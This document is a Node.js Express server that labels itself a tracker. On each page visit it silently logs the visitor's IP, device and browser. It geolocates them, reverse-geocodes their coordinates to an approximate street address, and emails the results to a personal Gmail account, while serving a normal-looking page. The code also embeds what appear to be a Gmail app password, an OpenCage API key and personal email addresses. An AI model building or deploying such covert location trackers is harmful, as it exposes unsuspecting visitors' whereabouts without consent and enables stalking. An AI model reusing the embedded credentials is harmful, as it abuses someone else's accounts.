const express = require('express');
const nodemailer = require('nodemailer');
const axios = require('axios');
const UAParser = require('ua-parser-js');
const app = express();

app.set('trust proxy', true);

const sessionStarts = {};

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER || 'staysane.rz@gmail.com',
    pass: process.env.EMAIL_PASS || 'nvkq cudo ibhh usdr'
  }
});

app.use((req, res, next) => {
  const ip = req.ip;
  if (!sessionStarts[ip]) {
    sessionStarts[ip] = new Date();
  }
  next();
});

app.get('/', async (req, res) => {
  const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const referrer = req.headers['referer'] || 'direct';
  const timestamp = new Date().toISOString();

  const parser = new UAParser(userAgent);
  const device = parser.getDevice();
  const os = parser.getOS();
  const browser = parser.getBrowser();

  const screenResolution = getApproximateResolution(device.model || userAgent);

  const connectionType = inferConnectionType(req);

  const sessionStart = sessionStarts[ip];
  const sessionDuration = sessionStart 
    ? `${(new Date() - sessionStart) / 1000} seconds` 
    : 'First visit';

  let location = 'Unknown';
  let coordinates = 'N/A';
  let timezone = 'N/A';
  let geoAddress = 'N/A';

  try {
    const geo = await axios.get(`http://ip-api.com/json/${ip}`);
    const { city, regionName, country, isp, lat, lon, timezone: tz } = geo.data;
    location = `${city}, ${regionName}, ${country} (ISP: ${isp})`;
    coordinates = `{Latitude, Longitude}: ${lat}, ${lon}`;
    timezone = tz || 'N/A';

    const OPEN_CAGE_KEY = 'cd07cd206f6a4f7086bed7fa65741f82';
    const reverseGeo = await axios.get(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${OPEN_CAGE_KEY}`);
    const components = reverseGeo.data.results[0]?.formatted;
    geoAddress = components || 'N/A';
  } catch (err) {
    console.error('Geo lookup failed:', err.message);
  }

  const mailOptions = {
    from: 'zyron',
    to: 'xraymundzyron@gmail.com',
    subject: 'Visitor accessed your URL',
    text: `New visit detected!

Timestamp: ${timestamp}
IP Address: ${ip}
Location: ${location}
Reverse Geocoded Address: ${geoAddress}
Coordinates: ${coordinates}
Timezone: ${timezone}

Device Brand: ${device.vendor || 'Unknown brand'}
Device Model: ${device.model || 'Unknown model'}
OS: ${os.name || 'OS'} ${os.version || ''}
Browser: ${browser.name || 'Browser'} ${browser.version || ''}

Approx. Screen Resolution: ${screenResolution}
Inferred Connection Type: ${connectionType}
Session Duration: ${sessionDuration}

User Agent: ${userAgent}
Referrer: ${referrer}`
  };

  transporter.sendMail(mailOptions, (error) => {
    if (error) console.error('Email failed:', error);
  });

  res.sendFile(__dirname + '/index.html');
});

function getApproximateResolution(deviceModel) {
  const resolutions = {
    'iPhone': '750x1334',      
    'iPad': '1536x2048',       
    'Macintosh': '1440x900',  
    'Windows': '1920x1080',    
    'Android': '1080x1920'     
  };
  return resolutions[deviceModel] || 'Unknown';
}

function inferConnectionType(req) {
  const ip = req.ip;
  if (ip.startsWith('192.0.0.') || ip.startsWith('172.16.')) {
    return 'Likely Mobile (Cellular)';
  }
  return 'Likely WiFi/Landline';
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Tracker running on port ${PORT}`));